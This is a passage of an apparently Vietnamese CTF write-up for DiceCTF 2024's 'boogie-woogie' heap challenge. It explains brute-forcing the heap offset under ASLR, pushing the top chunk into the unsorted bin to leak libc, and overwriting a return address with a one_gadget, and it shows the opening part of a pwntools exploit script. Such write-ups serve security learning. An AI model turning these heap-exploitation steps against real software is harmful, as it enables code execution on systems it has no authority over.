</span></span><span style="display:flex;"><span><span style="color:#ae81ff">56330</span>ee12000<span style="color:#f92672">-</span><span style="color:#ae81ff">56330</span>ee13000 r<span style="color:#f92672">--</span>p <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344433</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie_patched
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">56330</span>ee13000<span style="color:#f92672">-</span><span style="color:#ae81ff">56330</span>ee14000 r<span style="color:#f92672">-</span>xp <span style="color:#ae81ff">00001000</span> <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344433</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie_patched
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">56330</span>ee14000<span style="color:#f92672">-</span><span style="color:#ae81ff">56330</span>ee20000 r<span style="color:#f92672">--</span>p <span style="color:#ae81ff">00002000</span> <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344433</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie_patched
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">56330</span>ee20000<span style="color:#f92672">-</span><span style="color:#ae81ff">56330</span>ee21000 r<span style="color:#f92672">--</span>p <span style="color:#ae81ff">0000</span>d000 <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344433</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie_patched
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">56330</span>ee21000<span style="color:#f92672">-</span><span style="color:#ae81ff">56330</span>ee23000 rw<span style="color:#f92672">-</span>p <span style="color:#ae81ff">0000e000</span> <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344433</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie_patched
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5633107</span>ab000<span style="color:#f92672">-</span><span style="color:#ae81ff">5633107</span>cc000 rw<span style="color:#f92672">-</span>p <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">0</span>                          [heap]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b000000<span style="color:#f92672">-</span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b028000 r<span style="color:#f92672">--</span>p <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344431</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>libc.so<span style="color:#ae81ff">.6</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b028000<span style="color:#f92672">-</span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b1bd000 r<span style="color:#f92672">-</span>xp <span style="color:#ae81ff">0002</span><span style="color:#ae81ff">8000</span> <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344431</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>libc.so<span style="color:#ae81ff">.6</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b1bd000<span style="color:#f92672">-</span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b215000 r<span style="color:#f92672">--</span>p <span style="color:#ae81ff">001</span>bd000 <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344431</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>libc.so<span style="color:#ae81ff">.6</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b215000<span style="color:#f92672">-</span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b216000 <span style="color:#f92672">---</span>p <span style="color:#ae81ff">00215000</span> <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344431</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>libc.so<span style="color:#ae81ff">.6</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b216000<span style="color:#f92672">-</span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b21a000 r<span style="color:#f92672">--</span>p <span style="color:#ae81ff">00215000</span> <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344431</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>libc.so<span style="color:#ae81ff">.6</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b21a000<span style="color:#f92672">-</span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b21c000 rw<span style="color:#f92672">-</span>p <span style="color:#ae81ff">0021</span><span style="color:#ae81ff">9000</span> <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344431</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>libc.so<span style="color:#ae81ff">.6</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b21c000<span style="color:#f92672">-</span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b229000 rw<span style="color:#f92672">-</span>p <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">0</span> 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b2ce000<span style="color:#f92672">-</span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b2d3000 rw<span style="color:#f92672">-</span>p <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">0</span> 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b2d3000<span style="color:#f92672">-</span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b2d5000 r<span style="color:#f92672">--</span>p <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344432</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>ld<span style="color:#f92672">-</span><span style="color:#ae81ff">2.35</span>.so
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b2d5000<span style="color:#f92672">-</span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b2ff000 r<span style="color:#f92672">-</span>xp <span style="color:#ae81ff">00002000</span> <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344432</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>ld<span style="color:#f92672">-</span><span style="color:#ae81ff">2.35</span>.so
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b2ff000<span style="color:#f92672">-</span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b30a000 r<span style="color:#f92672">--</span>p <span style="color:#ae81ff">0002</span>c000 <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344432</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>ld<span style="color:#f92672">-</span><span style="color:#ae81ff">2.35</span>.so
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b30b000<span style="color:#f92672">-</span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b30d000 r<span style="color:#f92672">--</span>p <span style="color:#ae81ff">00037000</span> <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344432</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>ld<span style="color:#f92672">-</span><span style="color:#ae81ff">2.35</span>.so
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b30d000<span style="color:#f92672">-</span><span style="color:#ae81ff">7f</span><span style="color:#ae81ff">835</span>b30f000 rw<span style="color:#f92672">-</span>p <span style="color:#ae81ff">0003</span><span style="color:#ae81ff">9000</span> <span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">02</span> <span style="color:#ae81ff">1344432</span>                    <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n_gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie<span style="color:#f92672">/</span>ld<span style="color:#f92672">-</span><span style="color:#ae81ff">2.35</span>.so
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7ff</span>c7b917000<span style="color:#f92672">-</span><span style="color:#ae81ff">7ff</span>c7b938000 rw<span style="color:#f92672">-</span>p <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">0</span>                          [stack]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7ff</span>c7b947000<span style="color:#f92672">-</span><span style="color:#ae81ff">7ff</span>c7b94b000 r<span style="color:#f92672">--</span>p <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">0</span>                          [vvar]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7ff</span>c7b94b000<span style="color:#f92672">-</span><span style="color:#ae81ff">7ff</span>c7b94d000 r<span style="color:#f92672">-</span>xp <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">0</span>                          [vdso]
</span></span><span style="display:flex;"><span>ffffffffff600000<span style="color:#f92672">-</span>ffffffffff601000 <span style="color:#f92672">--</span>xp <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">0</span>                  [vsyscall]
</span></span></code></pre></div><p>Nhận thấy offset giữa vùng data và vùng heap bị ảnh hưởng bởi ASLR nên không cố định.</p>
<p><a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/kernel/process.c">source/arch/x86/kernel/process.c</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">arch_randomize_brk</span>(<span style="color:#66d9ef">struct</span> mm_struct <span style="color:#f92672">*</span>mm)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">randomize_page</span>(mm<span style="color:#f92672">-&gt;</span>brk, <span style="color:#ae81ff">0x02000000</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Nhìn vào source trên, địa chỉ của Heap sẽ bắt đầu từ 0 -&gt; 0x02000000 (dài khoảng 8192 pages) tính từ địa chỉ kết thúc của program (bằng 0 nếu binary không có cơ chế ASLR), mà địa chỉ Heap trải dài khoảng 33 pages (dài 0x21000). Do đó ta có thể brute tương đương 1/249 lần (33/8192) để có thể xác định được 1 địa chỉ hợp lệ ở phân vùng Heap, từ đó ta có thể xác định được địa chỉ Heap base bằng cách kiểm tra byte cuối của <code>top chunk</code> hoặc <code>tcache_perthread_struct</code> size field.</p>
<h3 id="leak-libc">Leak LIBC</h3>
<p>Leak libc từ 1 chunk được đưa vào unsorted bin nhờ AAR là điều mà ta thường hay làm, nhưng ở bài này thì không đơn giản như vậy. Ta có thể allocate 1 chunk lớn thông qua hàm <code>scanf</code> nhưng sau khi kết thúc hàm scanf nó sẽ free và consolidate với top-chunk nên ta sẽ không thể leak được.</p>
<p>Ta có thể ghi đè size của top-chunk:</p>
<ul>
<li>Khi mà size của top-chunk không đủ lớn để phân bổ, nó sẽ gọi đến <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L2547">sysmalloc</a> để phân bổ vùng heap mới và sẽ gọi đến <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4420">_int_free</a> để free top-chunk cũ nếu thõa mãn các điều kiện dưới đây</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> ((old_top <span style="color:#f92672">==</span> <span style="color:#a6e22e">initial_top</span> (av) <span style="color:#f92672">&amp;&amp;</span> old_size <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>  ((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>) (old_size) <span style="color:#f92672">&gt;=</span> MINSIZE <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">prev_inuse</span> (old_top) <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>   ((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>) old_end <span style="color:#f92672">&amp;</span> (pagesize <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>));
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> ((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>) (old_size) <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>) (nb <span style="color:#f92672">+</span> MINSIZE));
</span></span></code></pre></div><ul>
<li>Vậy nếu chỉnh sửa byte thứ 3 của top-chunk thành null-byte rồi cấp phát 1 chunk cực lớn thông qua hàm <code>scanf</code> là chúng ta đã có thể đưa top-chunk vào unsorted-bin.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> bins
</span></span><span style="display:flex;"><span>tcachebins
</span></span><span style="display:flex;"><span>empty
</span></span><span style="display:flex;"><span>fastbins
</span></span><span style="display:flex;"><span>empty
</span></span><span style="display:flex;"><span>unsortedbin
</span></span><span style="display:flex;"><span>all: <span style="color:#ae81ff">0x562a15d01ab0</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7f55a46a1ce0</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x562a15d01ab0</span>
</span></span><span style="display:flex;"><span>smallbins
</span></span><span style="display:flex;"><span>empty
</span></span><span style="display:flex;"><span>largebins
</span></span><span style="display:flex;"><span>empty
</span></span></code></pre></div><h3 id="get-shell">Get SHELL</h3>
<p>Bây giờ ta đã có AAW với địa chỉ libc vừa được leak, đơn giản ta sẽ leak stack thông qua <code>__libc_envrion</code> rồi ghi đè <code>return address</code> về <code>one_gadget</code> .</p>
<h2 id="solve-script-1">Solve Script</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./boogie-woogie_patched&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.log_level = &#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">connect</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> process(<span style="color:#e6db74">&#39;./boogie-woogie_patched&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>DOCKER:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> remote(<span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#ae81ff">1337</span>)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">clap_str</span>(num1, num2):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(num1<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> num2<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">clap</span>(v1,v2):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline((str(v1)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">+</span>str(v2))<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">aar</span>(addr):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
</span></span><span style="display:flex;"><span>        clap(addr<span style="color:#f92672">+</span>i, <span style="color:#ae81ff">1</span><span style="color:#f92672">+</span>i)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception:&#34;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4m&#34;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;L&#34;</span>)
</span></span><span style="display:flex;"><span>    ptr <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>addr<span style="color:#f92672">+</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception:&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ptr
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">aaw</span>(addr1, addr2, len):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len):
</span></span><span style="display:flex;"><span>        clap(addr1<span style="color:#f92672">+</span>i<span style="color:#f92672">-</span>elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;data&#39;</span>], addr2<span style="color:#f92672">+</span>i<span style="color:#f92672">-</span>elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;data&#39;</span>])
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">brute_heap_offset</span>():
</span></span><span style="display:flex;"><span>    idx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> log<span style="color:#f92672">.</span>progress(<span style="color:#e6db74">&#39;Bruting&#39;</span>) <span style="color:#66d9ef">as</span> p:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>                idx <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>                p<span style="color:#f92672">.</span>status(<span style="color:#e6db74">&#34;attempt </span><span style="color:#e6db74">%i</span><span style="color:#e6db74">&#34;</span>, idx)
</span></span><span style="display:flex;"><span>                io <span style="color:#f92672">=</span> connect()
</span></span><span style="display:flex;"><span>                io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception&#34;</span>)
</span></span><span style="display:flex;"><span>                trial_heap_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1995fe0</span>
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>                io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;1 </span><span style="color:#e6db74">{</span>trial_heap_offset<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>                
</span></span><span style="display:flex;"><span>                io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception&#34;</span>)
</span></span><span style="display:flex;"><span>                io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;1 </span><span style="color:#e6db74">{</span>trial_heap_offset<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>                p<span style="color:#f92672">.</span>success()
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> (io, trial_heap_offset <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">12</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">12</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">EOFError</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">with</span> context<span style="color:#f92672">.</span>local(log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;error&#39;</span>): io<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io, heap_page <span style="color:#f92672">=</span> brute_heap_offset()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>__dso_handle <span style="color:#f92672">=</span> aar(<span style="color:#f92672">-</span><span style="color:#ae81ff">24</span>)
